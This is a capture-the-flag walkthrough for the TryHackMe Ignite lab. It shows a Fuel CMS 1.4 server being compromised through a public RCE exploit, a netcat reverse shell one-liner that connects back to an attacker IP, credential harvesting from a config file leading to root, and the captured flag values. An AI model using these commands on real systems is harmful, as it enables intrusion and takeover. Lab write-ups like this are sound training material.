The Ignite room on TryHackMe is a Capture The Flag (CTF) challenge where you'll compromise a web server running the Fuel CMS application. The objective is to find two flags: user.txt and root.txt.
This walkthrough covers the complete attack path: 
1. Initial reconnaissance
2. Exploiting a known Remote Code Execution (RCE) vulnerability
3. Establishing a reverse shell
4. Privilege escalation via discovered credentials
5. Capturing the final flags

*****************
a).Reconnaissance
*****************
Start by scanning the target machine to identify open ports and services.
Command: nmap -sS -A -T4 -p- <IP-ADDR> -oN nmap.txt

Scan Results:

    Port 80/tcp - open (Apache httpd 2.4.18 on Ubuntu)

    HTTP Title - "Welcome to FUEL CMS"

    robots.txt - disallows /fuel/ 

Visiting the website reveals Fuel CMS version 1.4. The footer of the page also contains default credentials: admin:admin

*************************************
b).Initial Foothold - Exploiting RCE
Finding the Exploit
*************************************

Fuel CMS 1.4 is vulnerable to Remote Code Execution. Use searchsploit to locate available exploits 
Command: searchsploit fuel cms 1.4

Results include:

    47138.py - Remote Code Execution (1)

    50477.py - Remote Code Execution (3) - Recommended

Executing the RCE

Run the exploit to gain command execution on the target
Command: python3 50477.py -u http://<TARGET_IP>/

The exploit provides a limited interactive shell where you can run system commands.

Verification: 
Enter Command $

Locating user.txt

The first flag is located in the www-data home directory
Enter Command $ cat /home/www-data/flag.txt
6470e394cbf6dab6a91682cc8585059b

User Flag: 6470e394cbf6dab6a91682cc8585059b

*******************************
3. Establishing a reverse shell
*******************************
On Attacker Machine
Start a Netcat listener 
Command: nc -lvnp 4444

On Target (via RCE)
Execute the following reverse shell command (replace YOUR_IP with your TryHackMe VPN IP)
Command: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc YOUR_IP 4444 > /tmp/f

Upgrading the Shell
Once connected, upgrade to an interactive TTY shell for better functionality
Command: python3 -c 'import pty; pty.spawn("/bin/bash")'

***********************
4. Privilege Escalation
***********************
Finding Database Credentials

Navigate to the Fuel CMS application configuration directory
Command: 
cd /var/www/html/fuel/application/config/
cat database.php

The configuration reveals MySQL credentials including the root password 
$db['default'] = array(
    'hostname' => 'localhost',
    'username' => 'root',
    'password' => 'mememe',
    'database' => 'fuel_schema',
    ...
);

Switching to Root User

These credentials work for the system's root user. Switch user with the discovered password
Command:
su root
Password: mememe

Capturing root.txt

Navigate to the root directory to find the final flag
Command:
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d



